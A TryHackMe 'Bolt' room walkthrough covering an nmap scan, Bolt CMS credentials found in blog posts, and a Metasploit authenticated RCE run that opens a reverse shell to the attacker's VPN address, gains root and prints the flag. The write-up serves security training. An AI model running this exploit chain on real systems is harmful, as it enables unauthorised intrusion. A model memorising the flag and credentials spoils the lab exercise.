# TryHackMe Walkthrough 
Room link: https://tryhackme.com/r/room/bolt

## Nmap:
```
nmap -sCV -v 10.10.189.54 
```
<pre>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 11:31 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:31
Completed NSE at 11:31, 0.00s elapsed
Initiating NSE at 11:31
Completed NSE at 11:31, 0.00s elapsed
Initiating NSE at 11:31
Completed NSE at 11:31, 0.00s elapsed
Initiating Ping Scan at 11:31
Scanning 10.10.189.54 [4 ports]
Completed Ping Scan at 11:31, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:31
Completed Parallel DNS resolution of 1 host. at 11:31, 0.05s elapsed
Initiating SYN Stealth Scan at 11:31
Scanning 10.10.189.54 [1000 ports]
Discovered open port 80/tcp on 10.10.189.54
Discovered open port 22/tcp on 10.10.189.54
Discovered open port 8000/tcp on 10.10.189.54
Completed SYN Stealth Scan at 11:31, 5.32s elapsed (1000 total ports)
Initiating Service scan at 11:31
Scanning 3 services on 10.10.189.54
Completed Service scan at 11:32, 29.96s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.189.54.
Initiating NSE at 11:32
Completed NSE at 11:32, 7.69s elapsed
Initiating NSE at 11:32
Completed NSE at 11:32, 11.14s elapsed
Initiating NSE at 11:32
Completed NSE at 11:32, 0.00s elapsed
Nmap scan report for 10.10.189.54
Host is up (2.6s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    (PHP 7.2.32-1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Bolt
|_http-title: Bolt | A hero is unleashed
  
NSE: Script Post-scanning.
Initiating NSE at 11:32
Completed NSE at 11:32, 0.00s elapsed
Initiating NSE at 11:32
Completed NSE at 11:32, 0.00s elapsed
Initiating NSE at 11:32
Completed NSE at 11:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
</pre>

## Opening IP in Browser:
### Did not find anything here 
![Screenshot 2024-07-22 210254](https://github.com/user-attachments/assets/257980f2-8be0-4cc6-9350-5099dadccb2c)


### Navigated to the port 8000, This has got some interesting pages
![Screenshot 2024-07-22 215524](https://github.com/user-attachments/assets/909c645b-e3ac-46b1-81ff-52a8e371f220)


### One of the blog reveals to us the username of the admin of the website
![Screenshot from 2024-07-22 11-41-03](https://github.com/user-attachments/assets/04d88e03-e942-4850-bf04-a7ab490d8345)

### And other blog reveals us the password in clear text 
![Screenshot from 2024-07-22 12-29-48](https://github.com/user-attachments/assets/e0753192-9bda-4f46-9a3d-51ab03f2ff99)



## SSH Login:
#### The username and passowrd are not for ssh 
```
ssh bolt@10.10.189.54
```
<pre>
The authenticity of host '10.10.189.54 (10.10.189.54)' can't be established.
ED25519 key fingerprint is SHA256:e1qiq3Gpe8kdF5iw8bxPh9T4IgoUlUqClso+H6525EE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.189.54' (ED25519) to the list of known hosts.
bolt@10.10.189.54's password: 
Permission denied, please try again.
bolt@10.10.189.54's password: 
</pre>

### Went to user manual page of Bolt CMS and found the login page details
![Screenshot 2024-07-22 220916](https://github.com/user-attachments/assets/8038d255-2403-4ed5-a8cb-4168f2383eaa)
### Logged in with the credentials and found the CMS version.

### Searched for the exploit in Exploit DB
![Screenshot 2024-07-22 221151](https://github.com/user-attachments/assets/e21ff7c1-cb55-4069-a53c-b8018886c8e0)

## Started the msfconsole:
#### Searched for the exploit in metasploit and selected the exploit and saw the options to set 
![Screenshot from 2024-07-22 12-14-40](https://github.com/user-attachments/assets/e1aab280-997b-4865-8cca-2f8a3e53eb16)

### Set the options LHOST, RHOSTS, USERNAME, PASSWORD and ran the exploit
<pre>
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST tun0
LHOST => 10.17.9.110
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.189.54
RHOSTS => 10.10.189.54
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123 
PASSWORD => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options
</pre>
#### RHOST is the ip of the machine
#### LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
#### USERNAME and PASSWORD is that we found in previous enumeration
#### TARGETURI is where you want to put our website url. here its bolt website in port 8000
```
msf6 exploit(unix/webapp/bolt_authenticated_rce) > run
```
<pre>
[*] Started reverse TCP handler on 10.17.9.110:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "sdkl".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file mnlzukxy.php.
[+] Deleted file rdtkllozkg.php.
[+] Used token b54399f7cfb24501eac04a71d2 to create bmphghhjytu.php.
[*] Attempting to execute the payload via "/files/bmphghhjytu.php?sdkl=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 2 opened (10.17.9.110:4444 -> 10.10.189.54:53504) at 2024-07-22 12:15:03 -0400
[+] Deleted file bmphghhjytu.php.
[+] Reverted user profile back to original state.

whoami
root

cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
</pre>



